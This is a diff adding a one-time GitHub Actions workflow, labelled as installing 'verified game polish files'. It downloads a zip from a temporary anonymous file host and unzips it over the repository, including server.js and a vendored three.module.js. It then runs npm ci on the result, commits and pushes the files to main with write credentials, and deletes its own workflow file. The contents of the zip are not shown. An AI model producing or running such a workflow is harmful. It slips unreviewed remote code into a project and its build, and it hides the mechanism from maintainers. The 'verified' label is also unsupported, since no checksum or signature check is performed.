@@ -1,0 +1,53 @@
+name: Install Game Polish
+
+on:
+  push:
+    branches:
+      - main
+    paths:
+      - .github/workflows/install-game-polish.yml
+
+permissions:
+  contents: write
+
+jobs:
+  install:
+    if: github.actor != 'github-actions[bot]'
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Check out repository
+        uses: actions/checkout@v4
+        with:
+          persist-credentials: true
+
+      - name: Install verified game polish files
+        shell: bash
+        run: |
+          set -euo pipefail
+          curl -L "https://litter.catbox.moe/qhpm0y.zip" -o /tmp/game-polish-upload.zip
+          unzip -o /tmp/game-polish-upload.zip -d .
+          test -s package.json
+          test -s package-lock.json
+          test -s server.js
+          test -s public/app.js
+          test -s public/index.html
+          test -s public/styles.css
+          test -s public/vendor/three.module.js
+          npm ci
+          npm run check
+
+      - name: Commit polish and remove one-time workflow
+        shell: bash
+        run: |
+          set -euo pipefail
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git rm -f .github/workflows/install-game-polish.yml
+          git add package.json package-lock.json server.js public/app.js public/index.html public/styles.css public/vendor/three.module.js
+          if git diff --cached --quiet; then
+            echo "No game polish changes to commit."
+          else
+            git commit -m "Polish driving feel and bundle Three.js locally"
+            git push
+          fi
